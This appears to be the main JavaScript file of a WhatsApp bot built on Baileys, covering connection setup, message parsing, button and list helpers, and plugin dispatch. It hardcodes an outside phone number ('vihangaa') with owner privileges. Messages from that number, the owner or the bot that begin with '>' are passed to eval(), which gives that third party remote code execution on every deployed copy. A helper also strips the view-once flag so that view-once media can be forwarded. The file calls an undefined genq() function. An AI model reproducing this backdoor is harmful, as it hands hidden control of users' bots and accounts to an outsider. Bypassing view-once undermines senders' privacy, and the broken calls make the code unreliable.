const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  jidNormalizedUser,
  fetchLatestBaileysVersion,
  getContentType,
  Browsers,
  getAggregateVotesInPollMessage,
   makeInMemoryStore,
  makeCacheableSignalKeyStore,
  receivedPendingNotifications,
  generateWAMessageFromContent,
  generateForwardMessageContent
  } = require('@whiskeysockets/baileys')
const P = require('pino')
const config = require('./config')
const util = require('util')
var {  
  connectdb, 
  input, 
  get, 
  updateCMDStore, 
  isbtnID, 
  getCMDStore,
  getCmdForCmdId,
  updb,
  searchfile, 
  GetPaper, 
  githubCreateNewFile, 
  DeletePaper,
  uploadBufferToGitHub
 } = require("./lib/database")

const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson} = require('./lib/functions')
const { sms,downloadMediaMessage } = require('./lib/msg')
const axios = require('axios');
const cheerio = require('cheerio');
const prefix = config.PREFIX;
const ownerNumber = config.OWNER;
const l = console.log
function genMsgId() {
  const lt = 'vihangayt';
  const prefix = "3EB";
  const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
  let randomText = prefix;

  for (let i = prefix.length; i < 22; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    randomText += characters.charAt(randomIndex);
  }

  return randomText;
}

const fs = require('fs');
const path = require('path');

// Function to decode Base64 and write to creds.json
function saveDecodedBase64ToCreds(base64String) {
    // Decode the Base64 string
    const decodedData = Buffer.from(base64String, 'base64').toString('utf-8');

    // Define the output file path
    const folderPath = path.join(__dirname, 'auth_info_baileys');
    const filePath = path.join(folderPath, 'creds.json');

    // Ensure the folder exists
    if (!fs.existsSync(folderPath)) {
        fs.mkdirSync(folderPath, { recursive: true });
    }

    // Write the decoded data to creds.json
    fs.writeFileSync(filePath, decodedData, 'utf8');

    console.log(`Decoded data has been saved to: ${filePath}`);
}

// <<==========PORTS===========>>
const express = require("express");
const app = express();
const port = process.env.PORT || 8000;
//====================================
async function connectToWA() {

    console.log("Connecting bot...");
    const { state, saveCreds } = useMultiFileAuthState(__dirname + '/auth_info_baileys/')
  var { version } = await fetchLatestBaileysVersion()
  const latestWebVersion = () => {
          let version
          try {
              let a = fetchJson('https://web.whatsapp.com/check-update?version=1&platform=web')
              version = [a.currentVersion.replace(/[.]/g, ', ')]
          } catch {
              version = [2, 2204, 13]
          }
          return version
   }
  const store = makeInMemoryStore({
          logger: P({ level: "silent", stream: "store" }),
      });
  const NodeCache = require("node-cache")
  const msgRetryCounterCache = new NodeCache()
  
      const conn = makeWASocket({
          logger: P({ level: 'silent' }),
          printQRInTerminal: true,     
       auth: {
           creds: state.creds,
           keys: makeCacheableSignalKeyStore(state.keys, P({ level: "fatal" }).child({ level: "fatal" })),
        },
        browser: Browsers.macOS("Safari"),
        getMessage: async (key) => {
           let jid = jidNormalizedUser(key.remoteJid)
           let msg = await store.loadMessage(jid, key.id)
  
           return msg?.message || ""
        },
        msgRetryCounterCache,
        defaultQueryTimeoutMs: undefined, 
        syncFullHistory: false,
        latestWebVersion,
     })
    
          store.bind(conn.ev)
  setInterval(() => {
      store.writeToFile(__dirname+"/store.json");
    }, 3000);
  
conn.ev.on('connection.update', async (update) => {
const { connection, lastDisconnect } = update
if (connection === 'close') {
if (lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut) {
connectToWA()
}
} else if (connection === 'open') {

  
console.log('Installing plugins 🔌... ')
await connectdb()
fs.readdirSync("./plugins/").forEach((plugin) => {
if (path.extname(plugin).toLowerCase() == ".js") {
require("./plugins/" + plugin);
}
});
console.log('Plugins installed ✅')
console.log('Bot connected ✅')
conn.sendMessage(ownerNumber + "@s.whatsapp.net", { text: `Derana News Bot Connected🔎🌐` } ,{messageId:genMsgId()} )    
sleep(5000)
}
})
conn.ev.on('creds.update', saveCreds)

conn.ev.on('messages.upsert', async(mek) => {
try {
mek = mek.messages[0]
if (!mek.message) return	
mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
if (mek.key && mek.key.remoteJid === 'status@broadcast') return
const m = sms(conn, mek)
const type = getContentType(mek.message)
const content = JSON.stringify(mek.message)
const from = mek.key.remoteJid
const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
const body = (type == 'interactiveResponseMessage' ) ? mek.message.interactiveResponseMessage  && mek.message.interactiveResponseMessage.nativeFlowResponseMessage && JSON.parse(mek.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson) && JSON.parse(mek.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id :(type == 'templateButtonReplyMessage' )? mek.message.templateButtonReplyMessage && mek.message.templateButtonReplyMessage.selectedId  : (type === 'conversation') ? mek.message.conversation : mek.message?.extendedTextMessage?.contextInfo?.hasOwnProperty('quotedMessage') &&
await isbtnID(mek.message?.extendedTextMessage?.contextInfo?.stanzaId) &&
getCmdForCmdId(await getCMDStore(mek.message?.extendedTextMessage?.contextInfo?.stanzaId), mek?.message?.extendedTextMessage?.text)
? getCmdForCmdId(await getCMDStore(mek.message?.extendedTextMessage?.contextInfo?.stanzaId), mek?.message?.extendedTextMessage?.text) : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
const args = body.trim().split(/ +/).slice(1)
const q = args.join(' ')
const isGroup = from.endsWith('@g.us')
const sender = mek.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)
const senderNumber = sender.split('@')[0]
const botNumber = conn.user.id.split(':')[0]
const pushname = mek.pushName || 'No Name'
const vihangaa = '94762898541'
const isVihanga = vihangaa?.includes(senderNumber)	
const isMe = botNumber?.includes(senderNumber)	
const isOwner = ownerNumber?.includes(senderNumber) 
const botNumber2 = await jidNormalizedUser(conn.user.id);
const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupAdmins = isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = isGroup ? groupAdmins?.includes(botNumber2) : false
const isAdmins = isGroup ? groupAdmins?.includes(sender) : false
const reply = (teks) => {
conn.sendMessage(from, { text: teks }, { quoted: mek })
}
conn.replyad = async (teks) => {
  return await conn.sendMessage(from, { text: teks ,
contextInfo: {
    mentionedJid: [ '' ],
    groupMentions: [],
    forwardingScore: 1,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: '120363182681793169@newsletter',
      serverMessageId: 127
    },
externalAdReply: { 
title: '𝗭𝗲𝗿𝗼-𝗧𝗪𝗢 𝗠𝗗 🍭',
body: 'ᴀ ꜱɪᴍᴘʟᴇ ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ',
mediaType: 1,
sourceUrl: "https://zerotwomd.me/" ,
thumbnailUrl: 'https://raw.githubusercontent.com/vihangayt0/ZeroTwo-Uploads/main/bbb61bc283cc1891a9a3c.jpg' ,
renderLargerThumbnail: false,
showAdAttribution: true
}
}}, { quoted: mek })
}
const NON_BUTTON = true // Implement a switch to on/off this feature...
conn.buttonMessage2 = async (jid, msgData,quotemek) => {
  if (!NON_BUTTON) {
    await conn.sendMessage(jid, msgData)
  } else if (NON_BUTTON) {
    let result = "";
    const CMD_ID_MAP = []
    msgData.buttons.forEach((button, bttnIndex) => {
const mainNumber = `${bttnIndex + 1}`;
result += `\n*${mainNumber} | ${button.buttonText.displayText}*\n`;

CMD_ID_MAP.push({ cmdId: mainNumber, cmd: button.buttonId });
    });

    if (msgData.headerType === 1) {
const buttonMessage = `${msgData.text}\n\n🔢 Reply below number,${result}\n\n${msgData.footer}`
const textmsg = await conn.sendMessage(from, { text: buttonMessage ,
  contextInfo: {
    mentionedJid: [ '' ],
    groupMentions: [],
    forwardingScore: 1,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: '120363182681793169@newsletter',
      serverMessageId: 127
    },
externalAdReply: { 
title: '𝗭𝗲𝗿𝗼-𝗧𝗪𝗢 𝗠𝗗 🍭',
body: 'ᴀ ꜱɪᴍᴘʟᴇ ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ',
mediaType: 1,
sourceUrl: "https://zerotwomd.me/" ,
thumbnailUrl: 'https://raw.githubusercontent.com/vihangayt0/ZeroTwo-Uploads/main/bbb61bc283cc1891a9a3c.jpg' ,
renderLargerThumbnail: false,
showAdAttribution: true
}
}}, { quoted: quotemek || mek})
await updateCMDStore(textmsg.key.id, CMD_ID_MAP);
    } else if (msgData.headerType === 4) {
const buttonMessage = `${msgData.caption}\n\n🔢 Reply below number,${result}\n\n${msgData.footer}`
const imgmsg = await conn.sendMessage(jid, { image: msgData.image, caption: buttonMessage ,
contextInfo: {
    mentionedJid: [ '' ],
    groupMentions: [],
    forwardingScore: 1,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: '120363182681793169@newsletter',
      serverMessageId: 127
    },
externalAdReply: { 
title: '𝗭𝗲𝗿𝗼-𝗧𝗪𝗢 𝗠𝗗 🍭',
body: 'ᴀ ꜱɪᴍᴘʟᴇ ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ',
mediaType: 1,
sourceUrl: "https://zerotwomd.me/" ,
thumbnailUrl: 'https://raw.githubusercontent.com/vihangayt0/ZeroTwo-Uploads/main/bbb61bc283cc1891a9a3c.jpg' ,
renderLargerThumbnail: false,
showAdAttribution: true
}
}}, { quoted: quotemek || mek})
await updateCMDStore(imgmsg.key.id, CMD_ID_MAP);
    }
  }
}

conn.buttonMessage = async (jid, msgData, quotemek) => {
  if (!NON_BUTTON) {
    await conn.sendMessage(jid, msgData)
  } else if (NON_BUTTON) {
    let result = "";
    const CMD_ID_MAP = []
    msgData.buttons.forEach((button, bttnIndex) => {
const mainNumber = `${bttnIndex + 1}`;
result += `\n*${mainNumber} | ${button.buttonText.displayText}*\n`;

CMD_ID_MAP.push({ cmdId: mainNumber, cmd: button.buttonId });
    });

    if (msgData.headerType === 1) {
const buttonMessage = `${msgData.text || msgData.caption}\n\n🔢 Reply below number,${result}\n\n└───────────◉\n\n${msgData.footer}`
const textmsg = await conn.sendMessage(from, { text: buttonMessage ,contextInfo: {
    mentionedJid: [ '' ],
    groupMentions: [],
    forwardingScore: 1,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: '120363182681793169@newsletter',
      serverMessageId: 127
    },
externalAdReply: { 
title: '𝗭𝗲𝗿𝗼-𝗧𝗪𝗢 𝗠𝗗 🍭',
body: 'ᴀ ꜱɪᴍᴘʟᴇ ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ',
mediaType: 1,
sourceUrl: "https://zerotwomd.me/" ,
thumbnailUrl: 'https://raw.githubusercontent.com/vihangayt0/ZeroTwo-Uploads/main/bbb61bc283cc1891a9a3c.jpg' ,
renderLargerThumbnail: false,
showAdAttribution: true
}
}}, { quoted: quotemek || mek})
await updateCMDStore(textmsg.key.id, CMD_ID_MAP);
    } else if (msgData.headerType === 4) {
const buttonMessage = `${msgData.caption}\n\n🔢 Reply below number,${result}\n\n└───────────◉\n\n${msgData.footer}`
const imgmsg = await conn.sendMessage(jid, { image: msgData.image, caption: buttonMessage ,contextInfo: {
    mentionedJid: [ '' ],
    groupMentions: [],
    forwardingScore: 1,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: '120363182681793169@newsletter',
      serverMessageId: 127
    },
externalAdReply: { 
title: '𝗭𝗲𝗿𝗼-𝗧𝗪𝗢 𝗠𝗗 🍭',
body: 'ᴀ ꜱɪᴍᴘʟᴇ ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ',
mediaType: 1,
sourceUrl: "https://zerotwomd.me/" ,
thumbnailUrl: 'https://raw.githubusercontent.com/vihangayt0/ZeroTwo-Uploads/main/bbb61bc283cc1891a9a3c.jpg' ,
renderLargerThumbnail: false,
showAdAttribution: true
}
}}, { quoted: quotemek || mek})
await updateCMDStore(imgmsg.key.id, CMD_ID_MAP);
    }
  }
}


conn.listMessage2 = async (jid, msgData, quotemek) => {
  if (!NON_BUTTON) {
    await conn.sendMessage(jid, msgData)
  } else if (NON_BUTTON) {
    let result = "";
    const CMD_ID_MAP = []

    msgData.sections.forEach((section, sectionIndex) => {
const mainNumber = `${sectionIndex + 1}`;
result += `\n*[${mainNumber}] ${section.title}*\n`;

section.rows.forEach((row, rowIndex) => {
  const subNumber = `${mainNumber}.${rowIndex + 1}`;
  const rowHeader = `   ${subNumber} | ${row.title}`;
  result += `${rowHeader}\n`;
  if (row.description) {
    result += `   ${row.description}\n\n`;
  }
  CMD_ID_MAP.push({ cmdId: subNumber, cmd: row.rowId });
});
    });

    const listMessage = `${msgData.text}\n\n${msgData.buttonText},${result}\n${msgData.footer}`
    const text = await conn.sendMessage(from, { text: listMessage ,
contextInfo: {
    mentionedJid: [ '' ],
    groupMentions: [],
    forwardingScore: 1,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: '120363182681793169@newsletter',
      serverMessageId: 127
    },
externalAdReply: { 
title: '𝗭𝗲𝗿𝗼-𝗧𝗪𝗢 𝗠𝗗 🍭',
body: 'ᴀ ꜱɪᴍᴘʟᴇ ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ',
mediaType: 1,
sourceUrl: "https://zerotwomd.me/" ,
thumbnailUrl: 'https://raw.githubusercontent.com/vihangayt0/ZeroTwo-Uploads/main/bbb61bc283cc1891a9a3c.jpg' ,
renderLargerThumbnail: false,
showAdAttribution: true
}
}}, { quoted: quotemek || mek})
    await updateCMDStore(text.key.id, CMD_ID_MAP);
  }
}

conn.listMessage = async (jid, msgData, quotemek) => {
  if (!NON_BUTTON) {
    await conn.sendMessage(jid, msgData)
  } else if (NON_BUTTON) {
    let result = "";
    const CMD_ID_MAP = []

    msgData.sections.forEach((section, sectionIndex) => {
const mainNumber = `${sectionIndex + 1}`;
result += `\n*[${mainNumber}] ${section.title}*\n`;

section.rows.forEach((row, rowIndex) => {
  const subNumber = `${mainNumber}.${rowIndex + 1}`;
  const rowHeader = `   ${subNumber} | ${row.title}`;
  result += `${rowHeader}\n`;
  if (row.description) {
    result += `   ${row.description}\n\n`;
  }
  CMD_ID_MAP.push({ cmdId: subNumber, cmd: row.rowId });
});
    });

    const listMessage = `${msgData.text}\n\n${msgData.buttonText},${result}\n${msgData.footer}`
    const text = await conn.sendMessage(from, { text: listMessage}, { quoted: quotemek || mek})
    await updateCMDStore(text.key.id, CMD_ID_MAP);
  }
}
conn.sendFileUrl = async(jid, url, caption, quoted, options = {}) => {
  let mime = '';
  let res = await axios.head(url)
  mime = res.headers['content-type']
  if (mime.split("/")[1] === "gif") {
      return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options }, { quoted: quoted,   ...options })
  }
  let type = mime.split("/")[0] + "Message"
  if (mime === "application/pdf") {
      return conn.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options }, { quoted: quoted,  ...options })
  }
  if (mime.split("/")[0] === "image") {
      return conn.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options }, { quoted: quoted ,  ...options })
  }
  if (mime.split("/")[0] === "video") {
      return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', ...options }, { quoted: quoted ,  ...options })
  }
  if (mime.split("/")[0] === "audio") {
      return conn.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options }, { quoted: quoted,  ...options })
  }
}
conn.copyNForward = async (jid, message, forceForward = false, options = {}) => {
  let vtype;
  if (options.readViewOnce) {
    message.message =
      message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message
        ? message.message.ephemeralMessage.message
        : message.message || undefined;
    vtype = Object.keys(message.message.viewOnceMessage.message)[0];
    delete message.message?.ignore;
    delete message.message.viewOnceMessage.message[vtype].viewOnce;
    message.message = { ...message.message.viewOnceMessage.message };
  }

  let mtype = Object.keys(message.message)[0];
  let content = await generateForwardMessageContent(message, forceForward);
  let ctype = Object.keys(content)[0];
  let context = {};
  if (mtype != 'conversation') context = message.message[mtype].contextInfo;
  content[ctype].contextInfo = { ...context, ...content[ctype].contextInfo };

  const waMessage = await generateWAMessageFromContent(
    jid,
    content,
    options
      ? {
          ...content[ctype],
          ...options,
          ...(options.contextInfo
            ? { contextInfo: { ...content[ctype].contextInfo, ...options.contextInfo } }
            : {}),
        }
      : {}
  );
  await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id });
  return waMessage;
};

	let isThisBot = true
if (!isMe && !isVihanga && !isOwner && !isGroup) return 
//==================================plugin map================================
const events = require('./command')
const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
if (isCmd) {
const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias?.includes(cmdName))
if (cmd) {
if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key }})

try {
cmd.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname,isVihanga, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
} catch (e) {
console.error("[PLUGIN ERROR] ", e);
}
}
}
events.commands.map(async(command) => {
if (body && command.on === "body") {
command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isVihanga,isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
} else if (mek.q && command.on === "text") {
command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname,isVihanga, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
} else if (
(command.on === "image" || command.on === "photo") &&
mek.type === "imageMessage"
) {
command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname,isVihanga, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
} else if (
command.on === "sticker" &&
mek.type === "stickerMessage"
) {
command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname,isVihanga, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
}});


//====================================================================
switch (command) {
case 'jid':
reply(from)
break

case 'sendd':
reply('done')
let d = await genq()
await conn.sendMessage('120363304764548202@newsletter', { image: d.buffer, caption: '`'+d.day+'`' })
break
case 'send':
reply('done')
let dd = await genq()
await conn.sendMessage(from, { image: dd.buffer, caption: '`'+dd.day+'`' })
break
default:				
if ((isOwner || isVihanga || isMe) && body.startsWith('>')) {
let bodyy = body.split('>')[1]
let code2 = bodyy.replace("°", ".toString()");
try {
let resultTest = await eval(code2);
if (typeof resultTest === "object") {
reply(util.format(resultTest));
} else {
reply(util.format(resultTest));
}
} catch (err) {
reply(util.format(err));
}}}
} catch (e) {
const isError = String(e)
console.log(isError)}
})
}
app.get("/", (req, res) => {
res.send("📟 SACHIBOT Working successfully!");
});
app.listen(port, () => console.log(`SACHIBOT Server listening on port http://localhost:${port}`));
setTimeout(() => {
connectToWA()
}, 3000);

